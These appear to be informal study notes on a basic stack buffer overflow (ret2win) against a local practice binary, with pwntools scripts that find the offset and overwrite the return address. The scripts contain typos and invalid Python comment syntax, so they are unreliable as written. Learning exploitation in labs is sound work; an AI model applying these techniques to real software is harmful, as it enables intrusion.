



Because C does not implicitly track buffer sizes, simple overwrites are common.


PIE stands for position independent executable.




pwn tools is gonna be really useful for debugging stuff and writing actually useful stuff. like overwriting a return address



type c to continue in dgb and then 
type r to run a program.


Say you wanna see how many A's to write using pwn tools you can do a cyclic pattern

with this


to get a cyclic pattern of 128 bytes do

pwn.cyclic(128) 

this will give us a input of 128 bytes

Then to see where the stack pointer is we shall type inside of the main function in gdb.

x/s $rsp 
the x stands for examine memory 
the /s tells GDB to interpret it as a string
**`$rsp`** is the register holding the current **stack pointer** in x86_64.

In other words, GDB is trying to interpret the “return address” on the stack as the start of a string. If your binary is compiled with symbols, GDB will resolve that pointer to the symbol name (e.g., `some_function+42`).

and with this pattern any four bytes within this pattern we can query and say where in this cyclic pattern are these four bytes. This will tell us exactly how far into our input our return address gets overwriten

for example to search for gaaa inside of the overwriten pattern and this in my example returns 24. Since this is teh first thing we know 24 bytes into our return address since that is what is at

So now since we know our return address is 24 bytes after our input.  lets right a script

```

import pwn
r = pwn.gdb.debug('./buffer_overflow')

r.send(pwn.cyclic(128))

pwn.cyclic_find("gaaa")

so now lets test the to see if we can target the return address

r.send(b"A"*24+b"B"*8) // the b stands for bytes so python k nows to send byte data. the 24 is because the return address is 24 bytes AFTER the first inputs of the overflow. Then we are overwriting the return address with 8 Bs to make sure it works

after this lets check

x/gx $rsp
```


Ok now lets overwrite it with a function inside the program.

Says there a function name win we can check where in the buffer overflow the win function is with

nm -a buffer_overflow | grep win.

we see it is at 4011af 

so in order in python to do this pwn tools has a nice function to covert this 4011af to convert this byte represential to little Endian.

pwn.p64(0x4011af) Lets make a script to do this

```
i,port pwn

r = pwn.gdb.debug('./buffer_overflow') // r = pwn.process("./buffer_overflow)
ret_addr = pwn.p64(0x4011af)

r.send(b"A"*24+ret_addr)
print(r.readall())
```